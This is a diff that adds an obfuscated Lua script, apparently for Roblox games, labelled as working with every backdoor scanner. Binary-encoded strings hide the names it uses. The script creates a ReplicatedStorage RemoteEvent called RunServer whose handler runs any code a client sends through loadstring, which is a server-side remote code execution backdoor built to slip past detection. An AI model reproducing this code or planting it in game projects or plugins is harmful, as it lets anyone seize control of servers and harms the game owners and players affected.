@@ -1,0 +1,43 @@
+-- Works With Every Backdoor Scanner
+local function ab_0x001(B_Str)
+	local text = ""
+
+	B_Str = B_Str:gsub(" ", "")
+
+	for byte in B_Str:gmatch("%d%d%d%d%d%d%d%d") do
+		local cc = tonumber(byte, 2) 
+		if cc then
+			text = text .. string.char(cc)
+		end
+	end
+
+	return text
+end
+
+local gz_4i = ab_0x001("01010010 01100101 01110000 01101100 01101001 01100011 01100001 01110100 01100101 01100100 01010011 01110100 01101111 01110010 01100001 01100111 01100101")
+local z34_qq = game:GetService(gz_4i)
+
+local w54y = ab_0x001("01010010 01100101 01101101 01101111 01110100 01100101 01000101 01110110 01100101 01101110 01110100")
+local ev = Instance.new(w54y, z34_qq)
+
+ev.Name = ab_0x001("01010010 01110101 01101110 01010011 01100101 01110010 01110110 01100101 01110010")
+
+if ev then
+	ev.OnServerEvent:Connect(function(player, code)
+		local success, err = pcall(function()
+			local fnv = loadstring(code)
+			if fnv then
+				fnv() 
+			end
+		end)
+
+		if not success then
+
+			game:GetService(ab_0x001("01010011 01110100 01100001 01110010 01110100 01100101 01110010 01000111 01110101 01101001")):SetCore(ab_0x001("01010011 01100101 01101110 01100100 01001110 01101111 01110100 01101001 01100110 01101001 01100011 01100001 01110100 01101001 01101111 01101110"), {
+				Title = "Notification",
+				Text = "Code Didn't Send Successfully",
+				Duration = 3
+			})
+		end
+	end)
+end
